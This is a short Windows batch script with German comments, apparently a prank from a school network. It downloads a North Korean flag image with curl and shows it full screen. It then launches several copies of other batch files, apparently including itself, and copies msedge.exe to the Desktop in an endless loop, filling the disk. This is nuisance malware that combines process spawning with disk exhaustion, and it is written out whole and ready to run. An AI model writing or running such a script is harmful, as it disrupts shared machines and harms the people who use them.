@echo off
set "sourceFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
set "destination=H:\Desktop"
set /a counter=1
curl -s -o nordkorea_flagge.jpg https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRDZre-WtzDJFyBC19BWsZEZUcnbCTY4s99yg&s

:: Bild im Vollbildmodus öffnen
start /max nordkorea_flagge.jpg

start "" "H:\Downloads\SigmaEdge.bat"
start "" "H:\Downloads\SigmaEdge.bat"
start "" "G:\Cla.if21\Benjamin Kuhnert\Sigma.bat"
start "" "H:\Downloads\SigmaEdge.bat"

:loop


set /a counter=%counter%+1
:: Kopieren mit Millisekunden im Namen
copy "%sourceFile%" "%destination%\Kopie_Nr_%counter%.exe"



goto loop